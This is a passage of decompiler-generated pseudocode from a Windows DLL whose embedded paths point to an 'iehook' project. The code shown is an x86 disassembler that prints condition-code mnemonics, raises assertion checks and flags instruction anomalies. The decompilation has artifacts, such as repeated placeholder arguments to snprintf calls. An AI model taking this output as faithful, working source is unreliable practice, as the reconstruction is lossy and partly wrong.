            v590 = v497;
            v592 = v496;
            v591 = v495;
            if (v593 != 1) {
                goto lab_0x1000c55a;
            } else {
                // 0x1000c534
                v589 = v588 | 16;
                goto lab_0x1000c547;
            }
        }
    }
  lab_0x1000c547:;
    int32_t v594 = *v498 + 56 * v589; // 0x1000c552
    v590 = (int32_t *)(v594 + 8);
    v592 = (char *)v594;
    v591 = v594;
    goto lab_0x1000c55a;
  lab_0x1000ecb7:
    // 0x1000ecb7
    if (*v243 >= 16) {
        if (v6 != 0) {
            // 0x1000fddb
            return 0;
        }
        uint32_t v984 = *v8; // 0x1000fd85
        uint32_t v985 = *v25 + v984; // 0x1000fd8f
        *v26 = a1 + 696;
        *v28 = *v27 + v984 / 0x80000000 + (int32_t)(v985 < v984);
        *v29 = v985;
        *v30 = (int32_t)"[0x%08I64X] ERROR: maximum instruction length reached (\"%s\")\n";
        _printf((char *)&g173);
        // 0x1000fdca
        *v26 = ___iob_func() + 32;
        _fflush((struct _IO_FILE *)&g173);
        // 0x1000fddb
        return 0;
    }
    if (v4 == NULL) {
        int32_t * v986 = (int32_t *)(v2 + 952); // 0x1000ecd7
        *v986 = *v986 + 1;
        return 1;
    }
    int32_t v962 = a1 + 336; // 0x1000ecf3
    int32_t * v965; // 0x1000b7b0
    int32_t * v964; // 0x1000b7b0
    int32_t * v973; // 0x1000b7b0
    int32_t * v972; // 0x1000b7b0
    int32_t * v960; // 0x1000b7b0
    int32_t * v961; // 0x1000b7b0
    int32_t * v967; // 0x1000b7b0
    int32_t * v969; // 0x1000b7b0
    int32_t v971; // 0x1000b7b0
    int32_t v963; // 0x1000b7b0
    char * v987; // 0x1000ef99
    if ((*v132 & 256) == 0) {
        // 0x1000f305
        if (*v140 != 0) {
            // 0x1000f320
            v150 = (int32_t *)(a1 + 856);
            v151 = (int32_t *)(a1 + 832);
            v152 = (int32_t *)(a1 + 836);
            v153 = (int32_t *)(a1 + 860);
            v154 = (int32_t *)(a1 + 864);
            v155 = (int32_t *)(a1 + 816);
            v156 = (int32_t *)(a1 + 792);
            v157 = (int32_t *)(a1 + 796);
            v177 = (char *)(a1 + 900);
            v178 = (int32_t *)(a1 + 784);
            v179 = (int32_t *)(a1 + 788);
            v137 = 0;
            v139 = v962;
            while (true) {
              lab_0x1000f320:
                // 0x1000f320
                v138 = v139;
                v141 = v137;
                int32_t * v142 = (int32_t *)(v138 + 8); // 0x1000f320
                int32_t * v143 = (int32_t *)(v138 + 12); // 0x1000f323
                v144 = (int32_t *)v138;
                int32_t v145 = *v144;
                if ((*v143 | *v142) == 0) {
                    // 0x1000f3d7
                    v135 = v141;
                    if ((v145 & 0x80000) == 0) {
                        goto lab_0x1000f609;
                    } else {
                        unsigned char v146 = *v147; // 0x1000f3e3
                        char v148 = v146 / 16 & 1; // 0x1000f3eb
                        if ((v146 & 32) == 0 == (v148 != 0)) {
                            goto lab_0x1000f405;
                        } else {
                            // 0x1000f3f4
                            v135 = v141;
                            if ((v146 & 32) == 0 || v148 != 0) {
                                goto lab_0x1000f609;
                            } else {
                                goto lab_0x1000f405;
                            }
                        }
                    }
                } else {
                    int32_t v149 = v145; // 0x1000f332
                    if ((v145 & 0x4000) != 0) {
                        // 0x1000f334
                        if (*v150 != 0) {
                            // 0x1000f33d
                            *v26 = 2276;
                            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *v29 = (int32_t)L"!Instruction->DataDst.Count";
                            __wassert();
                        }
                        // 0x1000f354
                        *v150 = 1;
                        *v151 = *v142;
                        *v152 = *v143;
                        *v153 = (int32_t)*(int16_t *)(v138 + 6);
                        *v154 = v138;
                        v149 = *v144;
                    }
                    // 0x1000f380
                    v135 = v141;
                    if ((v149 & 0x2000) == 0) {
                        goto lab_0x1000f609;
                    } else {
                        // 0x1000f38c
                        if (*v155 != 0) {
                            // 0x1000f395
                            *v26 = 2285;
                            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *v29 = (int32_t)L"!Instruction->DataSrc.Count";
                            __wassert();
                        }
                        // 0x1000f3ac
                        *v155 = 1;
                        *v156 = *v142;
                        *v157 = *v143;
                        v158 = (int16_t *)(v138 + 6);
                        v159 = v141;
                        goto lab_0x1000f603;
                    }
                }
            }
        }
        goto lab_0x1000f61f_2;
    } else {
        char * v988 = (char *)(a1 + 340); // 0x1000ecff
        if ((*v988 & 63) == 2) {
            // 0x1000ed0a
            if (*(int16_t *)(a1 + 342) < 3) {
                int32_t v989 = *(int32_t *)(a1 + 788); // 0x1000ed11
                if (v989 < 0 && v989 >= 0 != v989 != 0) {
                    char * v990 = (char *)(a1 + 900); // 0x1000ed1f
                    *v990 = *v990 | 1;
                    *(int32_t *)(a1 + 904) = v962;
                }
            }
        }
        char v991 = *v14; // 0x1000ed2c
        if ((v991 & 16) == 0) {
            uint32_t v992 = *v8; // 0x1000ed35
            uint32_t v993 = v992 / 0x80000000; // 0x1000ed3b
            uint32_t v994 = *(int32_t *)(a1 + 348); // 0x1000ed44
            if (v994 >= v993) {
                uint32_t v995 = *(int32_t *)(a1 + 344); // 0x1000ed3e
                if (v995 < v992 != v994 <= v993) {
                    uint32_t v996 = *v243; // 0x1000ed4f
                    uint32_t v997 = v996 + v992; // 0x1000ed57
                    uint32_t v998 = v993 + (int32_t)(v997 < v996); // 0x1000ed59
                    if (v994 <= v998) {
                        if (v995 >= v997 != v994 >= v998) {
                            char v999 = v991; // 0x1000ed6f
                            if (v6 == 0) {
                                uint32_t v1000 = *v25; // 0x1000ed71
                                uint32_t v1001 = v1000 + v992; // 0x1000ed77
                                *v26 = *v27 + v993 + (int32_t)(v1001 < v1000);
                                *v28 = v1001;
                                *v29 = (int32_t)"[0x%08I64X] ANOMALY: branch into the middle of an instruction\n";
                                _printf((char *)v993);
                                v999 = *v14;
                            }
                            // 0x1000ed91
                            *v14 = v999 | 16;
                        }
                    }
                }
            }
        }
        int32_t v1002 = *v130; // 0x1000ed98
        g167 = v1002 - 257;
        switch (v1002) {
            case 257: {
                int32_t * v1003 = (int32_t *)v962; // 0x1000edb3
                int32_t v1004 = *v1003 | 0x10000; // 0x1000edb3
                *v1003 = v1004;
                int32_t v1005 = v1004; // 0x1000edc0
                if (*v140 != 1) {
                    // 0x1000edc2
                    *v26 = 2143;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Instruction->OperandCount == 1";
                    __wassert();
                    v1005 = *v1003;
                }
                // 0x1000edd9
                if ((v1005 & 0x180000) == 0) {
                    // 0x1000ede1
                    if ((*(char *)(a1 + 777) & 2) != 0) {
                        // 0x1000ede7
                        *v26 = 2146;
                        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *v29 = (int32_t)L"!X86Instruction->HasSelector";
                        __wassert();
                    }
                    // 0x1000edfe
                    *(int32_t *)(a1 + 752) = 1;
                }
                int32_t * v1006 = (int32_t *)(a1 + 344);
                int32_t * v1007 = (int32_t *)(a1 + 348);
                if ((*v1007 | *v1006) == 0) {
                    unsigned char v1008 = *v147; // 0x1000ee54
                    if ((v1008 & 64) == 0) {
                        goto lab_0x1000f61f_2;
                    } else {
                        char v1009 = v1008 / 16 & 1; // 0x1000ee65
                        if ((v1008 & 32) == 0 == (v1009 != 0)) {
                            goto lab_0x1000ee7f;
                        } else {
                            if ((v1008 & 32) == 0 || v1009 != 0) {
                                goto lab_0x1000f61f_2;
                            } else {
                                goto lab_0x1000ee7f;
                            }
                        }
                    }
                } else {
                    // 0x1000ee0d
                    v963 = 2152;
                    v964 = v1007;
                    v965 = v1006;
                    v961 = v1007;
                    v960 = v1006;
                    if (*(char *)(a1 + 900) < 8) {
                        goto lab_0x1000ee2d;
                    } else {
                        goto lab_0x1000ee1b;
                    }
                }
            }
            case 258: {
                // 0x1000f14a
                if (*v140 != 1) {
                    // 0x1000f153
                    *v26 = 2225;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Instruction->OperandCount == 1";
                    __wassert();
                }
                int32_t * v1010 = (int32_t *)v962; // 0x1000f16a
                if ((*v1010 & 0x10000) == 0) {
                    // 0x1000f172
                    *v26 = 2226;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Operand1->Flags & OP_ADDRESS";
                    __wassert();
                }
                // 0x1000f189
                if ((*v988 & 63) != 2) {
                    // 0x1000f194
                    *v26 = 2227;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Operand1->Type == OPTYPE_OFFSET";
                    __wassert();
                }
                // 0x1000f1ab
                if ((*v1010 & 0x180000) == 0) {
                    // 0x1000f1b3
                    if ((*(char *)(a1 + 777) & 2) != 0) {
                        // 0x1000f1b9
                        *v26 = 2230;
                        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *v29 = (int32_t)L"!X86Instruction->HasSelector";
                        __wassert();
                    }
                    // 0x1000f1d0
                    *(int32_t *)(a1 + 752) = 1;
                }
                int32_t * v1011 = (int32_t *)(a1 + 344);
                int32_t * v1012 = (int32_t *)(a1 + 348);
                if ((*v1012 | *v1011) == 0) {
                    goto lab_0x1000f61f_2;
                } else {
                    // 0x1000f1e3
                    v971 = 2236;
                    v972 = v1012;
                    v973 = v1011;
                    v969 = v1012;
                    v967 = v1011;
                    if (*(char *)(a1 + 900) < 8) {
                        goto lab_0x1000f203;
                    } else {
                        goto lab_0x1000f1f1;
                    }
                }
            }
            case 259: {
                // 0x1000ef8f
                *v132 = *v132 | 2048;
                v987 = (char *)(a1 + 900);
                *v987 = *v987 | 2;
                int32_t * v1013 = (int32_t *)v962; // 0x1000efa0
                int32_t v1014 = *v1013 | 0x10000; // 0x1000efa0
                *v1013 = v1014;
                int32_t v1015 = v1014; // 0x1000efad
                if (*v140 != 1) {
                    // 0x1000efaf
                    *v26 = 2185;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Instruction->OperandCount == 1";
                    __wassert();
                    v1015 = *v1013;
                }
                // 0x1000efc6
                if ((v1015 & 0x180000) == 0) {
                    // 0x1000efce
                    if ((*(char *)(a1 + 777) & 2) != 0) {
                        // 0x1000efd4
                        *v26 = 2188;
                        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *v29 = (int32_t)L"!X86Instruction->HasSelector";
                        __wassert();
                    }
                    // 0x1000efeb
                    *(int32_t *)(a1 + 752) = 1;
                }
                int32_t * v1016 = (int32_t *)(a1 + 344);
                int32_t * v1017 = (int32_t *)(a1 + 348);
                if ((*v1017 | *v1016) == 0) {
                    unsigned char v1018 = *v147; // 0x1000f011
                    if ((v1018 & 64) == 0) {
                        goto lab_0x1000f61f_2;
                    } else {
                        char v1019 = v1018 / 16 & 1; // 0x1000f022
                        if ((v1018 & 32) == 0 == (v1019 != 0)) {
                            goto lab_0x1000f03c;
                        } else {
                            if ((v1018 & 32) == 0 || v1019 != 0) {
                                goto lab_0x1000f61f_2;
                            } else {
                                goto lab_0x1000f03c;
                            }
                        }
                    }
                } else {
                    // 0x1000effa
                    v963 = 2194;
                    v964 = v1017;
                    v965 = v1016;
                    v961 = v1017;
                    v960 = v1016;
                    if (*v987 < 8) {
                        goto lab_0x1000ee2d;
                    } else {
                        goto lab_0x1000ee1b;
                    }
                }
            }
            case 261: {
                // 0x1000f2f6
                *v132 = *v132 | 2048;
                goto lab_0x1000f61f_2;
            }
            case 262: {
                char * v1020 = (char *)(a1 + 900); // 0x1000f24c
                *v1020 = *v1020 | 1;
                if (*v140 != 1) {
                    // 0x1000f25c
                    *v26 = 2246;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Instruction->OperandCount == 1";
                    __wassert();
                }
                int32_t * v1021 = (int32_t *)v962; // 0x1000f273
                if ((*v1021 & 0x10000) == 0) {
                    // 0x1000f27b
                    *v26 = 2247;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Operand1->Flags & OP_ADDRESS";
                    __wassert();
                }
                // 0x1000f292
                if ((*v988 & 63) != 2) {
                    // 0x1000f29d
                    *v26 = 2248;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"Operand1->Type == OPTYPE_OFFSET";
                    __wassert();
                }
                // 0x1000f2b4
                if ((*v1021 & 0x180000) != 0) {
                    // 0x1000f2bc
                    *v26 = 2249;
                    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v29 = (int32_t)L"!(Operand1->Flags & (OP_GLOBAL|OP_FAR))";
                    __wassert();
                }
                int32_t * v1022 = (int32_t *)(a1 + 344);
                int32_t * v1023 = (int32_t *)(a1 + 348);
                if ((*v1023 | *v1022) == 0) {
                    goto lab_0x1000f61f_2;
                } else {
                    // 0x1000f2df
                    v971 = 2252;
                    v972 = v1023;
                    v973 = v1022;
                    v969 = v1023;
                    v967 = v1022;
                    if (*v1020 < 8) {
                        goto lab_0x1000f203;
                    } else {
                        goto lab_0x1000f1f1;
                    }
                }
            }
            default: {
                goto lab_0x1000f61f_2;
            }
        }
    }
  lab_0x1000ec7c:;
    unsigned char v981 = *v9; // 0x1000ec7c
    int32_t v982 = v981; // 0x1000ec7c
    *v26 = (int32_t)&g4;
    *v28 = v981 == -1 ? 0 : 256 - v982;
    *v29 = a1 + 8 + v982;
    int32_t v983 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000eca3
    *v9 = *v9 + (char)v983;
    goto lab_0x1000ecb7;
  lab_0x1000c55a:;
    char * v595 = v592;
    v501 = v587;
    v500 = v595;
    if (*v590 == 0) {
        // 0x1000c560
        v501 = v587;
        v500 = v595;
        if (*(int32_t *)v591 == 0) {
            if (v6 != 0) {
                // 0x1000fddb
                return 0;
            }
            // 0x1000c56f
            *v26 = v588;
            *v28 = (int32_t)*v502;
            *v29 = (int32_t)*v332;
            uint32_t v596 = *v8; // 0x1000c58b
            uint32_t v597 = *v25 + v596; // 0x1000c592
            *v30 = (int32_t)*v331;
            *(int32_t *)(v257 - 20) = *v27 + v596 / 0x80000000 + (int32_t)(v597 < v596);
            *(int32_t *)(v257 - 24) = v597;
            *(int32_t *)(v257 - 28) = (int32_t)"[0x%08I64X] ERROR: Illegal SSE instruction opcode 0x%02X 0x%02X + prefix 0x%02X + extension %d\n";
            _printf((char *)&g173);
            // 0x1000fdca
            *v26 = ___iob_func() + 32;
            _fflush((struct _IO_FILE *)&g173);
            // 0x1000fddb
            return 0;
        }
    }
    goto lab_0x1000c5b3;
  lab_0x1000db1b:;
    unsigned char v598 = *v9;
    char v599; // 0x1000b7b0
    if ((*v14 & 1) == 0) {
        // 0x1000db6d
        v599 = 0;
        if (v598 != 0) {
            // 0x1000db77
            *(char *)(a1 + 8 + (int32_t)v598) = 32;
            char v600 = *v9 + 1; // 0x1000db7f
            *v9 = v600;
            v599 = v600;
        }
    } else {
        char v601 = v598; // 0x1000db2b
        if (v598 >= 125) {
            // 0x1000db2d
            *v26 = 1974;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)&g3;
            __wassert();
            v601 = *v9;
        }
        char v602 = v601;
        v599 = 124;
        if (v602 != 124) {
            // 0x1000db50
            *(char *)(a1 + 8 + (int32_t)v602) = 32;
            char v603 = *v9 + 1; // 0x1000db5c
            *v9 = v603;
            v599 = v603;
            while (v603 != 124) {
                // 0x1000db50
                *(char *)(a1 + 8 + (int32_t)v603) = 32;
                v603 = *v9 + 1;
                *v9 = v603;
                v599 = v603;
            }
        }
    }
    char v604 = v599; // 0x1000db93
    int32_t v605 = *v606; // 0x1000db85
    char v607 = v604; // 0x1000db8d
    if (v605 != 0) {
        int32_t v608 = v604; // 0x1000db93
        *v26 = (int32_t)"COND:{ ";
        *v28 = v604 == -1 ? 0 : 256 - v608;
        int32_t v609 = a1 + 8;
        *v29 = v609 + v608;
        int32_t v610 = __snprintf((char *)v605, (int32_t)&g173, (char *)&g173); // 0x1000dbba
        char v611 = *v9 + (char)v610; // 0x1000dbbf
        *v9 = v611;
        int32_t v612 = v605 & 64; // 0x1000dbd1
        char v613 = v611; // 0x1000dbd7
        if (v612 != 0) {
            int32_t v614 = v611; // 0x1000dbc8
            *v26 = (int32_t)"L ";
            *v28 = v611 == -1 ? 0 : 256 - v614;
            *v29 = v609 + v614;
            int32_t v615 = __snprintf((char *)v612, (int32_t)&g173, (char *)&g173); // 0x1000dbfa
            v613 = *v9 + (char)v615;
            *v9 = v613;
        }
        char v616 = v613; // 0x1000dc15
        int32_t v617 = v605 & 0x2000; // 0x1000dc0b
        char v618 = v616; // 0x1000dc13
        if (v617 != 0) {
            int32_t v619 = v616; // 0x1000dc15
            *v26 = (int32_t)"NL ";
            *v28 = v616 == -1 ? 0 : 256 - v619;
            *v29 = v609 + v619;
            int32_t v620 = __snprintf((char *)v617, (int32_t)&g173, (char *)&g173); // 0x1000dc3c
            v618 = *v9 + (char)v620;
            *v9 = v618;
        }
        char v621 = v618; // 0x1000dc57
        int32_t v622 = v605 & 128; // 0x1000dc4d
        char v623 = v621; // 0x1000dc55
        if (v622 != 0) {
            int32_t v624 = v621; // 0x1000dc57
            *v26 = (int32_t)"LE ";
            *v28 = v621 == -1 ? 0 : 256 - v624;
            *v29 = v609 + v624;
            int32_t v625 = __snprintf((char *)v622, (int32_t)&g173, (char *)&g173); // 0x1000dc7e
            v623 = *v9 + (char)v625;
            *v9 = v623;
        }
        char v626 = v623; // 0x1000dc97
        char v627 = v626; // 0x1000dcff
        if ((v605 & 0x4000) != 0) {
            int32_t v628 = v626; // 0x1000dc97
            *v26 = (int32_t)"NLE ";
            *v28 = v626 == -1 ? 0 : 256 - v628;
            *v29 = v609 + v628;
            int32_t v629 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000dcbe
            unsigned char v630 = *v9 + (char)v629; // 0x1000dcc6
            *v9 = v630;
            int32_t v631 = v630; // 0x1000dcd0
            *v26 = (int32_t)"G ";
            *v28 = v630 == -1 ? 0 : 256 - v631;
            *v29 = v609 + v631;
            int32_t v632 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000dcf7
            v627 = *v9 + (char)v632;
            *v9 = v627;
        }
        char v633 = v627; // 0x1000dd0b
        char v634 = v633; // 0x1000dd09
        if (v622 != 0) {
            int32_t v635 = v633; // 0x1000dd0b
            *v26 = (int32_t)"NG ";
            *v28 = v633 == -1 ? 0 : 256 - v635;
            *v29 = v609 + v635;
            int32_t v636 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000dd32
            v634 = *v9 + (char)v636;
            *v9 = v634;
        }
        char v637 = v634; // 0x1000dd46
        char v638 = v637; // 0x1000dd44
        if (v617 != 0) {
            int32_t v639 = v637; // 0x1000dd46
            *v26 = (int32_t)"GE ";
            *v28 = v637 == -1 ? 0 : 256 - v639;
            *v29 = v609 + v639;
            int32_t v640 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000dd6d
            v638 = *v9 + (char)v640;
            *v9 = v638;
        }
        char v641 = v638; // 0x1000dd81
        char v642 = v641; // 0x1000dd7f
        if (v612 != 0) {
            int32_t v643 = v641; // 0x1000dd81
            *v26 = (int32_t)"NGE ";
            *v28 = v641 == -1 ? 0 : 256 - v643;
            *v29 = v609 + v643;
            int32_t v644 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000dda8
            v642 = *v9 + (char)v644;
            *v9 = v642;
        }
        char v645 = v642; // 0x1000ddc3
        int32_t v646 = v605 & 1536; // 0x1000ddb9
        char v647 = v645; // 0x1000ddc1
        if (v646 != 0) {
            int32_t v648 = v645; // 0x1000ddc3
            *v26 = (int32_t)"A ";
            *v28 = v645 == -1 ? 0 : 256 - v648;
            *v29 = v609 + v648;
            int32_t v649 = __snprintf((char *)v646, (int32_t)&g173, (char *)&g173); // 0x1000ddea
            v647 = *v9 + (char)v649;
            *v9 = v647;
        }
        char v650 = v647; // 0x1000de03
        int32_t v651 = v605 & 32; // 0x1000ddfb
        char v652 = v650; // 0x1000de01
        if (v651 != 0) {
            int32_t v653 = v650; // 0x1000de03
            *v26 = (int32_t)"NA ";
            *v28 = v650 == -1 ? 0 : 256 - v653;
            *v29 = v609 + v653;
            int32_t v654 = __snprintf((char *)v651, (int32_t)&g173, (char *)&g173); // 0x1000de2a
            v652 = *v9 + (char)v654;
            *v9 = v652;
        }
        char v655 = v652; // 0x1000de45
        int32_t v656 = v605 & 512; // 0x1000de3b
        char v657 = v655; // 0x1000de43
        if (v656 != 0) {
            int32_t v658 = v655; // 0x1000de45
            *v26 = (int32_t)"AE ";
            *v28 = v655 == -1 ? 0 : 256 - v658;
            *v29 = v609 + v658;
            int32_t v659 = __snprintf((char *)v656, (int32_t)&g173, (char *)&g173); // 0x1000de6c
            v657 = *v9 + (char)v659;
            *v9 = v657;
        }
        char v660 = v657; // 0x1000de85
        int32_t v661 = v605 & 2; // 0x1000de7d
        char v662 = v660; // 0x1000deed
        if (v661 != 0) {
            int32_t v663 = v660; // 0x1000de85
            *v26 = (int32_t)"NAE ";
            *v28 = v660 == -1 ? 0 : 256 - v663;
            *v29 = v609 + v663;
            int32_t v664 = __snprintf((char *)v661, (int32_t)&g173, (char *)&g173); // 0x1000deac
            unsigned char v665 = *v9 + (char)v664; // 0x1000deb4
            *v9 = v665;
            int32_t v666 = v665; // 0x1000debe
            *v26 = (int32_t)"B ";
            *v28 = v665 == -1 ? 0 : 256 - v666;
            *v29 = v609 + v666;
            int32_t v667 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000dee5
            v662 = *v9 + (char)v667;
            *v9 = v662;
        }
        char v668 = v662; // 0x1000def9
        char v669 = v668; // 0x1000def7
        if (v656 != 0) {
            int32_t v670 = v668; // 0x1000def9
            *v26 = (int32_t)"NB ";
            *v28 = v668 == -1 ? 0 : 256 - v670;
            *v29 = v609 + v670;
            int32_t v671 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000df20
            v669 = *v9 + (char)v671;
            *v9 = v669;
        }
        char v672 = v669; // 0x1000df34
        char v673 = v672; // 0x1000df32
        if (v651 != 0) {
            int32_t v674 = v672; // 0x1000df34
            *v26 = (int32_t)"BE ";
            *v28 = v672 == -1 ? 0 : 256 - v674;
            *v29 = v609 + v674;
            int32_t v675 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000df5b
            v673 = *v9 + (char)v675;
            *v9 = v673;
        }
        char v676 = v673; // 0x1000df6f
        char v677 = v676; // 0x1000df6d
        if (v646 != 0) {
            int32_t v678 = v676; // 0x1000df6f
            *v26 = (int32_t)"NBE ";
            *v28 = v676 == -1 ? 0 : 256 - v678;
            *v29 = v609 + v678;
            int32_t v679 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000df96
            v677 = *v9 + (char)v679;
            *v9 = v677;
        }
        char v680 = v677; // 0x1000dfaf
        int32_t v681 = v605 & 4; // 0x1000dfa7
        char v682 = v680; // 0x1000dfad
        if (v681 != 0) {
            int32_t v683 = v680; // 0x1000dfaf
            *v26 = (int32_t)"E ";
            *v28 = v680 == -1 ? 0 : 256 - v683;
            *v29 = v609 + v683;
            int32_t v684 = __snprintf((char *)v681, (int32_t)&g173, (char *)&g173); // 0x1000dfd6
            v682 = *v9 + (char)v684;
            *v9 = v682;
        }
        char v685 = v682; // 0x1000dfef
        char v686 = v685; // 0x1000dfed
        if ((v605 & 1024) != 0) {
            int32_t v687 = v685; // 0x1000dfef
            *v26 = (int32_t)"NE ";
            *v28 = v685 == -1 ? 0 : 256 - v687;
            *v29 = v609 + v687;
            int32_t v688 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e016
            v686 = *v9 + (char)v688;
            *v9 = v686;
        }
        char v689 = v686; // 0x1000e02a
        char v690 = v689; // 0x1000e028
        if (v661 != 0) {
            int32_t v691 = v689; // 0x1000e02a
            *v26 = (int32_t)"C ";
            *v28 = v689 == -1 ? 0 : 256 - v691;
            *v29 = v609 + v691;
            int32_t v692 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e051
            v690 = *v9 + (char)v692;
            *v9 = v690;
        }
        char v693 = v690; // 0x1000e065
        char v694 = v693; // 0x1000e063
        if (v656 != 0) {
            int32_t v695 = v693; // 0x1000e065
            *v26 = (int32_t)"NC ";
            *v28 = v693 == -1 ? 0 : 256 - v695;
            *v29 = v609 + v695;
            int32_t v696 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e08c
            v694 = *v9 + (char)v696;
            *v9 = v694;
        }
        char v697 = v694; // 0x1000e0a0
        char v698 = v697; // 0x1000e09e
        if (v681 != 0) {
            int32_t v699 = v697; // 0x1000e0a0
            *v26 = (int32_t)"Z ";
            *v28 = v697 == -1 ? 0 : 256 - v699;
            *v29 = v609 + v699;
            int32_t v700 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e0c7
            v698 = *v9 + (char)v700;
            *v9 = v698;
        }
        char v701 = v698; // 0x1000e0d9
        char v702 = v701; // 0x1000e0d7
        if ((v605 & 1024) != 0) {
            int32_t v703 = v701; // 0x1000e0d9
            *v26 = (int32_t)"NZ ";
            *v28 = v701 == -1 ? 0 : 256 - v703;
            *v29 = v609 + v703;
            int32_t v704 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e100
            v702 = *v9 + (char)v704;
            *v9 = v702;
        }
        char v705 = v702; // 0x1000e119
        int32_t v706 = v605 & 16; // 0x1000e111
        char v707 = v705; // 0x1000e117
        if (v706 != 0) {
            int32_t v708 = v705; // 0x1000e119
            *v26 = (int32_t)"P ";
            *v28 = v705 == -1 ? 0 : 256 - v708;
            *v29 = v609 + v708;
            int32_t v709 = __snprintf((char *)v706, (int32_t)&g173, (char *)&g173); // 0x1000e140
            v707 = *v9 + (char)v709;
            *v9 = v707;
        }
        char v710 = v707; // 0x1000e159
        char v711 = v710; // 0x1000e157
        if ((v605 & 0x1000) != 0) {
            int32_t v712 = v710; // 0x1000e159
            *v26 = (int32_t)"NP ";
            *v28 = v710 == -1 ? 0 : 256 - v712;
            *v29 = v609 + v712;
            int32_t v713 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e180
            v711 = *v9 + (char)v713;
            *v9 = v711;
        }
        char v714 = v711; // 0x1000e194
        char v715 = v714; // 0x1000e192
        if (v706 != 0) {
            int32_t v716 = v714; // 0x1000e194
            *v26 = (int32_t)"PE ";
            *v28 = v714 == -1 ? 0 : 256 - v716;
            *v29 = v609 + v716;
            int32_t v717 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e1bb
            v715 = *v9 + (char)v717;
            *v9 = v715;
        }
        char v718 = v715; // 0x1000e1cd
        char v719 = v718; // 0x1000e1cb
        if ((v605 & 0x1000) != 0) {
            int32_t v720 = v718; // 0x1000e1cd
            *v26 = (int32_t)"PO ";
            *v28 = v718 == -1 ? 0 : 256 - v720;
            *v29 = v609 + v720;
            int32_t v721 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e1f4
            v719 = *v9 + (char)v721;
            *v9 = v719;
        }
        char v722 = v719; // 0x1000e208
        char v723 = v722; // 0x1000e206
        if ((v605 & 1) != 0) {
            int32_t v724 = v722; // 0x1000e208
            *v26 = (int32_t)"O ";
            *v28 = v722 == -1 ? 0 : 256 - v724;
            *v29 = v609 + v724;
            int32_t v725 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e22f
            v723 = *v9 + (char)v725;
            *v9 = v723;
        }
        char v726 = v723; // 0x1000e246
        char v727 = v726; // 0x1000e244
        if ((v605 & 256) != 0) {
            int32_t v728 = v726; // 0x1000e246
            *v26 = (int32_t)"NO ";
            *v28 = v726 == -1 ? 0 : 256 - v728;
            *v29 = v609 + v728;
            int32_t v729 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e26d
            v727 = *v9 + (char)v729;
            *v9 = v727;
        }
        char v730 = v727; // 0x1000e281
        char v731 = v730; // 0x1000e27f
        if (v706 != 0) {
            int32_t v732 = v730; // 0x1000e281
            *v26 = (int32_t)"U ";
            *v28 = v730 == -1 ? 0 : 256 - v732;
            *v29 = v609 + v732;
            int32_t v733 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e2a8
            v731 = *v9 + (char)v733;
            *v9 = v731;
        }
        char v734 = v731; // 0x1000e2ba
        char v735 = v734; // 0x1000e2b8
        if ((v605 & 0x1000) != 0) {
            int32_t v736 = v734; // 0x1000e2ba
            *v26 = (int32_t)"NU ";
            *v28 = v734 == -1 ? 0 : 256 - v736;
            *v29 = v609 + v736;
            int32_t v737 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e2e1
            v735 = *v9 + (char)v737;
            *v9 = v735;
        }
        char v738 = v735; // 0x1000e2f5
        char v739 = v738; // 0x1000e2f3
        if ((v605 & 8) != 0) {
            int32_t v740 = v738; // 0x1000e2f5
            *v26 = (int32_t)"S ";
            *v28 = v738 == -1 ? 0 : 256 - v740;
            *v29 = v609 + v740;
